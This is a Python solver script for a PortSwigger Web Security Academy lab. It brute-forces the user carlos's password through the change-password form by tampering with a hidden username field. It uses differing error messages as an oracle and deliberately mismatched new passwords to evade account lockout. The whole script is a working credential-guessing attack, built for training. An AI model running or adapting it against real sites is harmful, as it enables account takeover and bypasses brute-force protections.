#!/usr/bin/env python3
"""
Password brute-force via password change
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 14-password-brute-force-via-password-change.md

What this does:
    Logs in as our own valid account (wiener:peter) once, then repeatedly submits
    POST /my-account/change-password with the hidden "username" field swapped to
    the victim (carlos) and each candidate password in "current-password". The
    two new-password fields are deliberately set to DIFFERENT values on every
    attempt -- submitting matching new passwords alongside a wrong current
    password locks the account, so the mismatch is what keeps this attack alive.
    A wrong current-password returns "Current password is incorrect"; a correct
    one instead returns "New passwords do not match", which is the oracle: the
    first candidate to produce that specific message is carlos's real password.
    None of this touches /login or its brute-force protection.

Usage:
    python 14-password-brute-force-via-password-change.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

ATTACKER_USER = "wiener"
ATTACKER_PASS = "peter"
TARGET_USER = "carlos"

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow",
]


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    page = client.get(f"{lab_url}/login")
    client.post(f"{lab_url}/login", data={
        "csrf": _csrf(page.text), "username": ATTACKER_USER, "password": ATTACKER_PASS
    })

    print(f"[*] Brute-forcing {TARGET_USER}'s password via /my-account/change-password...")
    found_pw = None
    for pw in PASSWORDS:
        page = client.get(f"{lab_url}/my-account")
        resp = client.post(f"{lab_url}/my-account/change-password", data={
            "csrf": _csrf(page.text),
            "username": TARGET_USER,
            "current-password": pw,
            "new-password-1": "new1",
            "new-password-2": "new2",  # deliberately mismatched -- avoids the account-lock path
        })
        if "new passwords do not match" in resp.text.lower():
            found_pw = pw
            print(f"[+] {TARGET_USER}'s password found: {pw}")
            break

    if not found_pw:
        print("[-] No password matched from the candidate list.")
        return

    page = client.get(f"{lab_url}/login")
    client.post(f"{lab_url}/login", data={
        "csrf": _csrf(page.text), "username": TARGET_USER, "password": found_pw
    })
    client.get(f"{lab_url}/my-account")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
